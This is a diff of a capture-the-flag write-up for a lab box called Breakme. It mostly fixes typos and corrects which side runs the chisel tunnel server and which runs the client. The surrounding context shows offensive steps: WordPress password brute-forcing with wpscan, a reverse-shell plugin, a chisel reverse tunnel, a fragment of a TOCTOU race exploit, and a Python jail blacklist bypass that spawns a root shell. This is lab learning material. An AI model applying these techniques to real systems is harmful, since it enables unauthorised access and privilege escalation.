@@ -38,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.55 seconds
 <h2>Step 2: Enumerating the webserver</h2>
 <p>Surfing to the IP address, I was greeted with the default apache server page:</p>
 <img src="/images/breakme/breakme_apache_default.webp" alt="default apache page" class="postImage">
-<p>After some directory bruteforcing using ffuf, I found outt that there is a Wordpress site:</p>
+<p>After some directory bruteforcing using ffuf, I found out that there is a Wordpress site:</p>
 <pre>
 ──(kali㉿kali)-[/opt]
 └─$ wpscan --url http://10.10.54.30/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames bob                                                            
@@ -176,7 +176,7 @@ connect to [10.9.235.177] from (UNKNOWN) [10.10.49.132] 33522
 </pre>
 
 <h2>Step 4: Lateral privilege escalation to john</h2>
-<p>Doing some exploring, I found some credentials to MariaDB database in a PHP configuration file. However, dumping the database and its stored credentials did not reval anything new. Then, I decided to run the following command and discovered something running on port 9999. Could it be an internal webserver?</p>
+<p>Doing some exploring, I found some credentials to MariaDB database in a PHP configuration file. However, dumping the database and its stored credentials did not reveal anything new. Then, I decided to run the following command and discovered something running on port 9999. Could it be an internal webserver?</p>
 <pre>
 www-data@Breakme:/var/www/html/wordpress/wp-content/plugins/reverse_shell_plugin$ ss -tulnp
 Netid            State             Recv-Q            Send-Q                         Local Address:Port                         Peer Address:Port            Process            
@@ -196,11 +196,11 @@ python3 -m http.server 4444
 <pre>
 wget &lt;IP-Address&gt;&lt;PORT&gt;/chisel
 </pre>
-<p>On the target run:</p>
+<p>On the attacking machine run:</p>
 <pre>
 ./chisel server --port 1234 --reverse
 </pre>
-<p>On the attacking machine, run:</p>
+<p>On the target machine, run:</p>
 <pre>
 ./chisel client &lt;YOUR_IP&gt;:1234 R:9999:127.0.0.1:9999
 </pre>
@@ -351,7 +351,7 @@ if (param_1 == 2)
         uVar3 = 1;
       }
 </pre>
-<p>Next, it checks whether the strings "flag" or "id_rsa" are present within the supplied argument. This prohibits the reading of the ssh keys of youcef as well as capturing any flags.</p>
+<p>Next, it checks whether the strings "flag" or "id_rsa" are present within the supplied argument. This prohibits the reading of the ssh keys of Youcef as well as capturing any flags.</p>
 <pre>
 local_10 = strstr(argv[1], "flag");
 local_18 = strstr(argv[1], "id_rsa");
@@ -378,7 +378,7 @@ do {
     sVar4 = write(1, local_428, (long)local_28); // write to stdout (fd=1)
 } while (0 < sVar4);
 </pre>
-<p>Here, I got stuck and had no idea on how this binary could be exploited to escalate to the "youcef" user. Thus, I consulted a writeup. Apparently, this binary is vulnerable to something that is called a "RACE" condition. More specifically, a TOCTOU RACE condition (Time-of-check to Time-of-use).This happens when a program first checks a file and after the check it does something with the file (in this case reading its contents). This is vulnerable as there is a small gap between the checks and the reading of the file. During this gap, we can replace/change the file and thereby tricking the program to open another file which would otherwise not pass the initial checks that are happening at the beginning of the code. In practice, this can be exploited as follows: </p>
+<p>Here, I got stuck and had no idea on how this binary could be exploited to escalate to the "Youcef" user. Thus, I consulted a writeup. Apparently, this binary is vulnerable to something that is called a "RACE" condition. More specifically, a TOCTOU RACE condition (Time-of-check to Time-of-use).This happens when a program first checks a file and after the check it does something with the file (in this case reading its contents). This is vulnerable as there is a small gap between the checks and the reading of the file. During this gap, we can replace/change the file and thereby tricking the program to open another file which would otherwise not pass the initial checks that are happening at the beginning of the code. In practice, this can be exploited as follows: </p>
 <pre>
 #!/bin/bash
 while true; do
@@ -733,5 +733,5 @@ eval(code)  # <- only runs if passed the check
 <p>The getUserInput() function retrieves the user input as a string and is therefore not executed until it reaches the eval function. So, if we type __IMPORT__.lower() or __IMPORT__.swapcase(). It looops through "bad" and it performs the following check: "import" in "IMPORT".lower()? → ❌ no match (uppercase vs lowercase). Therefore, we can bypass the blacklist as the .lower() or .swapcase() is executed when evalling our string. Note, here we had to use swapcase() as loweer() was also in the banned keyword list. So, combined in our final payload, we use the abovementioned bypass to import the "os" module. This is done via the builtins and dict method (__dict__  allows to list all attributes which includes functions variables and classes of the module in a dictionairy) allowing us to call upon it using some string magic, thereby bypassing the blacklisted words. Using the same logic, the system function is called upon which can be used to spawn a root shell after blacklist evasion. </p>
 
 <h2>Final thoughts</h2>
-<p> In general, it was a fun but very lengthy box. The initial parts to gain access were quite easy but still a good learning experience. In contrast, the privilege escalation part of the box involving the decompiling the readfile binary as well as the python jail escape were a bit harder. After several days of trying, I eventually had to look at a walkthough for a hint. Nevertheless, I learned a lot of new things doing this box and therefore it was a good learning experience.</p>
+<p> In general, it was a fun but very lengthy box. The initial parts to gain access were quite easy but still a good learning experience. In contrast, the privilege escalation part of the box involving the decompiling of the readfile binary as well as the python jail escape were a bit harder. After several days of trying, I eventually had to look at a walkthough for a hint. Nevertheless, I learned a lot of new things doing this box and therefore it was a good learning experience.</p>
 <a href="/">Go to the Home Page</a>
